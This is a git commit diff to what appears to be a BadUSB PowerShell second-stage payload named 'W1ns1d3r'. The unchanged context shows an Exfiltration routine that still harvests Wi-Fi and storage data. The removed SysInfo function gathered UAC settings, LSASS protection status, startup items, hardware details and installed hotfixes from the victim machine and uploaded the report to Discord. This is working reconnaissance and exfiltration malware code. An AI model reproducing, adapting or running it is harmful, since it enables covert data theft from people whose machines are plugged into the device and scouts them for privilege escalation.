e42aa815ec732def6c4ca4035f11046b353390b6
Gvte-Kali <132758165+Gvte-Kali@users.noreply.github.com>
2024-01-30 20:57:19 +0100

    Update stage2_t3st.ps1

--- BadUSB/W1ns1d3r/W1ns1d3r_t3st/stage2_t3st.ps1
+++ BadUSB/W1ns1d3r/W1ns1d3r_t3st/stage2_t3st.ps1
@@ -58,9 +58,6 @@ function Exfiltration {
     # Call Wifi function
     Wifi
 
-    # Call SysInfo function
-    SysInfo
-
     #Call Get-StorageAndTreeInfo
     StorageAndTreeInfo
 
@@ -113,83 +110,6 @@ function Wifi {
 
     # Supprime le dossier temporaire wifi
     Remove-Item -Path "C:\temp\wifi" -Force -Recurse
-}
-
-
-function SysInfo {
-    # Get desktop path
-    $desktop = ([Environment]::GetFolderPath("Desktop"))
-
-    # Get registry values
-    $ConsentPromptBehaviorAdmin_Value = (Get-ItemProperty -LiteralPath "Registry::$Key" -Name $ConsentPromptBehaviorAdmin_Name).$ConsentPromptBehaviorAdmin_Name
-    $PromptOnSecureDesktop_Value = (Get-ItemProperty -LiteralPath "Registry::$Key" -Name $PromptOnSecureDesktop_Name).$PromptOnSecureDesktop_Name
-
-
-
-    # Evaluate UAC settings
-    If($ConsentPromptBehaviorAdmin_Value -Eq 0 -And $PromptOnSecureDesktop_Value -Eq 0){ $UAC = "Never notify" }
-    ElseIf($ConsentPromptBehaviorAdmin_Value -Eq 5 -And $PromptOnSecureDesktop_Value -Eq 0){ $UAC = "Notify me only when apps try to make changes to my computer (do not dim my desktop)" } 
-    ElseIf($ConsentPromptBehaviorAdmin_Value -Eq 5 -And $PromptOnSecureDesktop_Value -Eq 1){ $UAC = "Notify me only when apps try to make changes to my computer (default)" }
-    ElseIf($ConsentPromptBehaviorAdmin_Value -Eq 2 -And $PromptOnSecureDesktop_Value -Eq 1){ $UAC = "Always notify" }
-    Else{ $UAC = "Unknown" } 
-
-    # Check if LSASS is running as a protected process
-    $lsass = Get-Process -Name "lsass"
-    if ($lsass.ProtectedProcess) {$lsassStatus = "LSASS is running as a protected process."} 
-    else {$lsassStatus = "LSASS is not running as a protected process."}
-
-    # Get names of items in the Startup folder
-    $StartUp = (Get-ChildItem -Path ([Environment]::GetFolderPath("Startup"))).Name
-
-    # Get System Information
-    $computerSystem = Get-CimInstance CIM_ComputerSystem
-    $computerName = $computerSystem.Name
-    $computerModel = $computerSystem.Model
-    $computerManufacturer = $computerSystem.Manufacturer
-    $computerBIOS = Get-CimInstance CIM_BIOSElement  | Out-String
-    $computerOs=(Get-WMIObject win32_operatingsystem) | Select Caption, Version  | Out-String
-    $computerCpu=Get-WmiObject Win32_Processor | select DeviceID, Name, Caption, Manufacturer, MaxClockSpeed, L2CacheSize, L2CacheSpeed, L3CacheSize, L3CacheSpeed | Format-List  | Out-String
-    $computerMainboard=Get-WmiObject Win32_BaseBoard | Format-List  | Out-String
-    $computerRamCapacity=Get-WmiObject Win32_PhysicalMemory | Measure-Object -Property capacity -Sum | % { "{0:N1} GB" -f ($_.sum / 1GB)}  | Out-String
-    $computerRam=Get-WmiObject Win32_PhysicalMemory | select DeviceLocator, @{Name="Capacity";Expression={ "{0:N1} GB" -f ($_.Capacity / 1GB)}}, ConfiguredClockSpeed, ConfiguredVoltage | Format-Table  | Out-String
-
-    # Get additional information
-    $AdditionalInfo = @"
-    UAC Setting: $UAC
-    LSASS Status: $lsassStatus
-    Startup Items: $StartUp
-    System Information:
-        Computer Name: $computerName
-        Model: $computerModel
-        Manufacturer: $computerManufacturer
-        BIOS: $computerBIOS
-        OS: $computerOs
-        CPU: $computerCpu
-        Mainboard: $computerMainboard
-        RAM Capacity: $computerRamCapacity
-        RAM: $computerRam
-"@
-
-
-
-    # Generate a report of updates installed on the computer
-    $userDir = "C:\Temp"
-    $fileSaveDir = New-Item -Path $userDir -ItemType Directory -Force
-    $date = Get-Date
-    $Report = "`r`n`r`nUpdate Report`r`n`r`nGenerated on: $Date`r`n`r`nInstalled Updates:`r`n"
-
-    $UpdatesInfo = Get-WmiObject Win32_QuickFixEngineering -ComputerName $env:COMPUTERNAME | Sort-Object -Property InstalledOn -Descending
-    foreach ($Update in $UpdatesInfo) {
-        $Report += "Description: $($Update.Description)`r`nHotFixId: $($Update.HotFixId)`r`nInstalledOn: $($Update.InstalledOn)`r`nInstalledBy: $($Update.InstalledBy)`r`n`r`n"
-    }
-
-    # Append additional information to the report
-    $Report += $AdditionalInfo
-
-    $Report | Out-File -FilePath "C:\Temp\System_Informations.txt" -Append -Encoding utf8
-
-    # Upload files to Discord via the Upload-Discord function
-    Upload-Discord -file "C:\temp\System_Informations.txt" -text "System Informations :"
 }
 
 
